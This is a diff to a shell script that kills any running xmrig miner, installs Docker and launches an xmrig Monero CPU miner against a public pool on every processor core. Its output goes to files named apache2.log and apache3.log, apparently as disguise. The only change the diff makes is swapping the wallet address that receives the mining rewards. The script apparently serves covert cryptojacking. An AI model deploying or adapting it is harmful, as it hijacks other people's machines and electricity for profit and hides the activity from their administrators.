@@ -6,7 +6,7 @@ killall xmrig
 desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
 apt -y install docker.io
 
-docker run warlax/xmrig-cpu-cryptonightv7 -o pool.monero.hashvault.pro:5555 -u 43P5Rt8Rnoi4RDvP4FWEWtLyJN9RV9MQJCohgmHgkLLHBJSoRo96SAvjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fXbps4 -p `cat index.html`  --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
+docker run warlax/xmrig-cpu-cryptonightv7 -o pool.monero.hashvault.pro:5555 -u 47CjztLCPNUN9rqs12ez78WzVWhd7HqDrbkdLGnwNCXnG9nJqCtQ4vvjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fQ38bW -p `cat index.html`  --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
 #docker run warlax/xmrig-cpu-cryptonightv7 -o pool.minexmr.com:4444 -u 4AYRy6UgnqiZ8tjtaRAUu4CQNjCZFwwQsBmFDnoc4cYoZzncJtAw4gCETE9e2E4TJNPLsJASuJyQUTj71N8hLgPdBjYpEeT -p x --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
 
 
